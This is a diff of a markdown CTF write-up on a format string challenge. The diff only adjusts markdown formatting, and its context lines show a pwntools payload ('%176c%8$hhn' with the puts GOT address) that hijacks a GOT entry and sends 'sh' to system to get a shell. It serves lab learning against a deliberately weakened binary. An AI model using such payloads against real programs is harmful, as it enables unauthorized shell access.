@@ -12,11 +12,11 @@ date: 2023-01-29
 
 
 ## format string bug background
-[printf %n](https://www.geeksforgeeks.org/g-fact-31/)
-![](https://media.geeksforgeeks.org/wp-content/cdn-uploads/20191009172738/n-in-printf.jpg)
+* [printf %n](https://www.geeksforgeeks.org/g-fact-31/)
+* ![](https://media.geeksforgeeks.org/wp-content/cdn-uploads/20191009172738/n-in-printf.jpg)
 
 ## Original Code
-```cpp!=
+```cpp
 #include <stdio.h>
 #include <unistd.h>
 #include <stdlib.h>
@@ -39,7 +39,7 @@ int main()
     return 0;
 }
 ```
-```bash!
+```bash
 $ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack
 ```
 * In this problem, we can consider to use `format string bug` to achieve `GOT hijacking` without buffer overflow.
@@ -75,7 +75,7 @@ $ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack
     ...
     ```
 2. Construct format string - try and error
-    ```python!
+    ```python
     r.sendafter("Give me fmt: ", b"%176c%8$hhn" + b"aaaaa" + p64(puts_got))
     ```
     **從結果來看比較清楚**
@@ -87,14 +87,14 @@ We want to modify `0x401030` to `0x401090`, so we just modify only **1 bytes**(f
 Combine all format sting: `%176c%8$hhn` and other space can pad trash bytes
 
 3. Pass the command to `system` function - `sh\x00` to open shell
-    ```python!
+    ```python
     r.sendafter("Give me string: ", "sh\x00")
     ```
 4. Finally, we got shell!!!
     ![](https://imgur.com/Zh5jE4N.png)
     
 * Whole exploit
-    ```python!
+    ```python
     from pwn import *
 
     context.arch = 'amd64'
